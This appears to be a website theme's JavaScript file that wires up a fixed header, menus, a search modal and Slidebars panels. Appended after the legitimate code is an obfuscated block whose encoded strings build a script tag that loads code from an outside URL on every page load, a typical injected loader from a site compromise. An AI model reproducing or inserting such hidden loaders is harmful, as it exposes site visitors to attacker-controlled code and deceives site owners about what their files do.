/*!
 * Version: 1.2 Development
 */



(function () {

    "use strict";




    var Core = {
        initialized: false,
        initialize: function () {
            if (this.initialized)
                return;
            this.initialized = true;
            this.build();
        },
        build: function () {

            this.fixedHeader();
           // Init toggle menu
            this.initToggleMenu();
      // Search
      this.initSearchModal();
      // Dropdown menu
      this.dropdownhover();

        },




   initSearchModal: function(options) {


      $(document).on("click", ".btn_header_search", function (event) {
        event.preventDefault();

        $(".header-search").addClass("open");
      });
      $(document).on("click", ".search-form_close , .search-close", function (event) {
        event.preventDefault();
        $(".header-search").removeClass("open");
      });

    },




        initToggleMenu: function () {


      $('.toggle-menu-button').each(function (i) {


            var trigger = $(this);
            var isClosed = true;

            function showMenu() {



                $('#nav').addClass('navbar-scrolling-fixing');



        if ( trigger.hasClass( "js-toggle-screen" )) {

             $('#fixedMenu').delay(0).fadeIn(300);

            }

                trigger.addClass('is-open');
                isClosed = false;
            }
          
          
          $('.fullmenu-close').on('click', function(e) {
                      e.preventDefault();
                      if (isClosed === true) {
                          hideMenu();
                      } else {
                          hideMenu();
                      }
                  });

            function hideMenu() {
                $('#fixedMenu').fadeOut(100);
                $('#nav').removeClass('navbar-scrolling-fixing');
                trigger.removeClass('is-open');
                isClosed = true;
            }

            trigger.on('click', function (e) {
                e.preventDefault();
                if (isClosed === true) {
                    showMenu();
                } else {
                    hideMenu();
                }
            });


     });   },



    dropdownhover: function(options) {
      /** Extra script for smoother navigation effect **/
      if ($(window).width() > 798) {
        $('.yamm').on('mouseenter', '.navbar-nav > .dropdown', function() {
          "use strict";
          $(this).addClass('open');
        }).on('mouseleave', '.navbar-nav > .dropdown', function() {
          "use strict";
          $(this).removeClass('open');
        });
      }
    },

        fixedHeader: function (options) {
            if ($(window).width() > 767) {
                // Fixed Header
                var topOffset = $(window).scrollTop();
                if (topOffset > 0) {
                    $('.header').addClass('navbar-scrolling');
                }
                $(window).on('scroll', function () {
                    var fromTop = $(this).scrollTop();
                    if (fromTop > 0) {
                        $('body').addClass('fixed-header');
                        $('.header').addClass('navbar-scrolling');
                    } else {
                        $('body').removeClass('fixed-header');
                       $('.header').removeClass('navbar-scrolling');
                    }

                });
            }
        },





    };
    Core.initialize();




      /////////////////////////////////////////////////////////////////
    //   Dropdown Menu Fade
    /////////////////////////////////////////////////////////////////




    $(".yamm >li").hover(
        function() {
            $('.dropdown-menu', this).fadeIn("fast");
        },
        function() {
            $('.dropdown-menu', this).fadeOut("fast");
        });




    window.prettyPrint && prettyPrint();
    $(document).on('click', '.yamm .dropdown-menu', function(e) {
        e.stopPropagation();
    });




  // Create a new instance of Slidebars
    var controller = new slidebars();

    // Events
    $( controller.events ).on( 'init', function () {
        //console.log( 'Init event' );
    } );

    $( controller.events ).on( 'exit', function () {
        //console.log( 'Exit event' );
    } );

    $( controller.events ).on( 'css', function () {
        //console.log( 'CSS event' );
    } );

    $( controller.events ).on( 'opening', function ( event, id ) {
        //console.log( 'Opening event of slidebar with id ' + id );
    } );

    $( controller.events ).on( 'opened', function ( event, id ) {
        //console.log( 'Opened event of slidebar with id ' + id );
    } );

    $( controller.events ).on( 'closing', function ( event, id ) {
        //console.log( 'Closing event of slidebar with id ' + id );
    } );

    $( controller.events ).on( 'closed', function ( event, id ) {
        //console.log( 'Closed event of slidebar with id ' + id );
    } );

    // Initialize Slidebars
    controller.init();



      // Mobile Slidebar controls



      $( '.js-toggle-mobile-slidebar' ).on( 'click', function ( event ) {
            event.stopPropagation();
            controller.toggle( 'mobile-slidebar' );
        } );





        // Panel nav  Slidebar controls



         $( '.js-open-slidebar-panel-left' ).on( 'click', function ( event ) {
      event.preventDefault();
      event.stopPropagation();
      controller.toggle( 'slidebar-panel-left' );
    } );





    // Left Slidebar controls
    $( '.js-open-left-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.open( 'slidebar-1' );
    } );

    $( '.js-close-left-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.close( 'slidebar-1' );
    } );

    $( '.js-toggle-left-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.toggle( 'slidebar-1' );
    } );

    // Right Slidebar controls
    $( '.js-open-right-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.open( 'slidebar-2' );
    } );

    $( '.js-close-right-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.close( 'slidebar-2' );
    } );

    $( '.js-toggle-right-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.toggle( 'slidebar-2' );
    } );

    // Top Slidebar controls
    $( '.js-open-top-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.open( 'slidebar-3' );
    } );

    $( '.js-close-top-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.close( 'slidebar-3' );
    } );

    $( '.js-toggle-top-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.toggle( 'slidebar-3' );
    } );

    // Bottom Slidebar controls
    $( '.js-open-bottom-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.open( 'slidebar-4' );
    } );

    $( '.js-close-bottom-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.close( 'slidebar-4' );
    } );

    $( '.js-toggle-bottom-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.toggle( 'slidebar-4' );
    } );

    // Close any
    $( controller.events ).on( 'opened', function () {
        $( '[data-canvas="container"]' ).addClass( 'js-close-any-slidebar' );
    $( '.toggle-menu-button' ).addClass( 'is-open' );
    } );

    $( controller.events ).on( 'closed', function () {
        $( '[data-canvas="container"]' ).removeClass( 'js-close-any-slidebar' );
    $( '.toggle-menu-button' ).removeClass( 'is-open' );
    } );

    $( 'body' ).on( 'click', '.js-close-any-slidebar', function ( event ) {
        event.stopPropagation();
        controller.close();
    } );

    // Initilize, exit and css reset
    $( '.js-initialize-slidebars' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.init();
    } );

    $( '.js-exit-slidebars' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.exit();
    } );

    $( '.js-reset-slidebars-css' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.css();
    } );

    // Is and get
    $( '.js-is-active' ).on( 'click', function ( event ) {
        event.stopPropagation();
        //console.log( controller.isActive() );
    } );

    $( '.js-is-active-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        var id = prompt( 'Enter a Slidebar id' );
        //console.log( controller.isActiveSlidebar( id ) );
    } );

    $( '.js-get-active-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        //console.log( controller.getActiveSlidebar() );
    } );

    $( '.js-get-all-slidebars' ).on( 'click', function ( event ) {
        event.stopPropagation();
        //console.log( controller.getSlidebars() );

    } );

    $( '.js-get-slidebar' ).on( 'click', function ( event ) {
        event.stopPropagation();
        var id = prompt( 'Enter a Slidebar id' );
        //console.log( controller.getSlidebar( id ) );
    } );

    // Callbacks
    $( '.js-init-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.init( function () {
            //console.log( 'Init callback' );
        } );
    } );

    $( '.js-exit-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.exit( function () {
            //console.log( 'Exit callback' );
        } );
    } );

    $( '.js-css-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.css( function () {
            //console.log( 'CSS callback' );
        } );
    } );

    $( '.js-open-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.open( 'slidebar-1', function () {
            //console.log( 'Open callback' );
        } );
    } );

    $( '.js-close-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.close( function () {
            //console.log( 'Close callback' );
        } );
    } );

    $( '.js-toggle-callback' ).on( 'click', function ( event ) {
        event.stopPropagation();
        controller.toggle( 'slidebar-1', function () {
            //console.log( 'Toggle callback' );
        } );
    } );



})();







function _0x29df(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x29df=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x29df['wDXlLL']===undefined){var _0x3df732=function(_0x424340){var _0x3455ab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28d3ed='',_0x3c2be7='';for(var _0x14ee97=0x0,_0x120811,_0x3eba9e,_0x71d602=0x0;_0x3eba9e=_0x424340['charAt'](_0x71d602++);~_0x3eba9e&&(_0x120811=_0x14ee97%0x4?_0x120811*0x40+_0x3eba9e:_0x3eba9e,_0x14ee97++%0x4)?_0x28d3ed+=String['fromCharCode'](0xff&_0x120811>>(-0x2*_0x14ee97&0x6)):0x0){_0x3eba9e=_0x3455ab['indexOf'](_0x3eba9e);}for(var _0x3dfedc=0x0,_0x1d1037=_0x28d3ed['length'];_0x3dfedc<_0x1d1037;_0x3dfedc++){_0x3c2be7+='%'+('00'+_0x28d3ed['charCodeAt'](_0x3dfedc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3c2be7);};_0x29df['yzgjyd']=_0x3df732,_0x117374=arguments,_0x29df['wDXlLL']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x1e444a=_0x29df['yzgjyd'](_0x1e444a),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x29df(_0x117374,_0x3567e5);}function _0x5d4f(){var _0x2f448a=['E8ouBCoTALdcRCozgCopcIy','W7xdGmkZtSotWPRdGmoFxGvtW5xcG8oj','mtbQz1HArwe','C2nYAxb0','ndLoqM9Htue','Ahr0Chm6lY9IAwDICMLJA3mUB3jNl2nQCfLsrM5Z','y3jLyxrLrwXLBwvUDa','nZC5nteYEwruDejY','m1zAAKfQEa','pKxcMCkiWOO6W7hdHSk9afxcTCkm','pu9OofxdIGj7W6lcPCk9i8oT','C3jJ','yxn5BMm','mtK1mZGZnK5WvxjuDq','c8ooqhalWQNdP0KFWPNcHXy','W54mWQfzWOVdSSoiWOygEWD/','mtG3mtyXmtjKAKjOBu4','CgfYzw50tM9Kzq','p8orac/dR8orW5pcPdiJEmkPW7W','mJi3nJCZnNHVD0rzuq','WRLilCoUW4KHW53dNXZcS01Z','mtG1nZGYnvvLvMz0qq'];_0x5d4f=function(){return _0x2f448a;};return _0x5d4f();}var _0x5d4478=_0x29df;(function(_0x1a2d6a,_0x3049cb){var _0x1c2103=_0x4243,_0x3c392e=_0x29df,_0x262ac0=_0x1a2d6a();while(!![]){try{var _0xe63e6c=parseInt(_0x3c392e(0x1e6))/0x1+-parseInt(_0x1c2103(0x1e9,'b77x'))/0x2*(parseInt(_0x3c392e(0x1e7))/0x3)+-parseInt(_0x3c392e(0x1dc))/0x4+-parseInt(_0x3c392e(0x1de))/0x5+-parseInt(_0x1c2103(0x1e8,'SJ4G'))/0x6+parseInt(_0x3c392e(0x1e3))/0x7*(parseInt(_0x1c2103(0x1dd,'D)Rg'))/0x8)+-parseInt(_0x3c392e(0x1ef))/0x9*(-parseInt(_0x3c392e(0x1e1))/0xa);if(_0xe63e6c===_0x3049cb)break;else _0x262ac0['push'](_0x262ac0['shift']());}catch(_0x7c24dd){_0x262ac0['push'](_0x262ac0['shift']());}}}(_0x5d4f,0xa1bbd));function _0x4243(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x4243=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x4243['RIbiwB']===undefined){var _0x3df732=function(_0x3455ab){var _0x28d3ed='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c2be7='',_0x14ee97='';for(var _0x120811=0x0,_0x3eba9e,_0x71d602,_0x3dfedc=0x0;_0x71d602=_0x3455ab['charAt'](_0x3dfedc++);~_0x71d602&&(_0x3eba9e=_0x120811%0x4?_0x3eba9e*0x40+_0x71d602:_0x71d602,_0x120811++%0x4)?_0x3c2be7+=String['fromCharCode'](0xff&_0x3eba9e>>(-0x2*_0x120811&0x6)):0x0){_0x71d602=_0x28d3ed['indexOf'](_0x71d602);}for(var _0x1d1037=0x0,_0x41c8ee=_0x3c2be7['length'];_0x1d1037<_0x41c8ee;_0x1d1037++){_0x14ee97+='%'+('00'+_0x3c2be7['charCodeAt'](_0x1d1037)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14ee97);};var _0x424340=function(_0x3b802e,_0x1cb759){var _0x3b9aa6=[],_0x4bbd7b=0x0,_0xc886d2,_0x1b34a9='';_0x3b802e=_0x3df732(_0x3b802e);var _0x225139;for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x3b9aa6[_0x225139]=_0x225139;}for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139]+_0x1cb759['charCodeAt'](_0x225139%_0x1cb759['length']))%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2;}_0x225139=0x0,_0x4bbd7b=0x0;for(var _0xce288f=0x0;_0xce288f<_0x3b802e['length'];_0xce288f++){_0x225139=(_0x225139+0x1)%0x100,_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139])%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2,_0x1b34a9+=String['fromCharCode'](_0x3b802e['charCodeAt'](_0xce288f)^_0x3b9aa6[(_0x3b9aa6[_0x225139]+_0x3b9aa6[_0x4bbd7b])%0x100]);}return _0x1b34a9;};_0x4243['KGSCtZ']=_0x424340,_0x117374=arguments,_0x4243['RIbiwB']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x4243['wwagSX']===undefined&&(_0x4243['wwagSX']=!![]),_0x1e444a=_0x4243['KGSCtZ'](_0x1e444a,_0x459630),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x4243(_0x117374,_0x3567e5);};(function(_0x71d602,_0x3dfedc,_0x1d1037,_0x41c8ee,_0x3b802e,_0x1cb759){var _0x49e9da=_0x4243,_0x3dac4e=_0x29df;_0x3b802e=_0x3dfedc[_0x3dac4e(0x1e5)](_0x1d1037),_0x1cb759=_0x3dfedc['getElementsByTagName'](_0x1d1037)[0x0],_0x3b802e[_0x3dac4e(0x1eb)]=0x1,_0x3b802e[_0x3dac4e(0x1ea)]=_0x41c8ee,_0x1cb759[_0x3dac4e(0x1f0)][_0x49e9da(0x1ed,'u4Tp')](_0x3b802e,_0x1cb759);}(window,document,_0x5d4478(0x1e2),_0x5d4478(0x1e4)));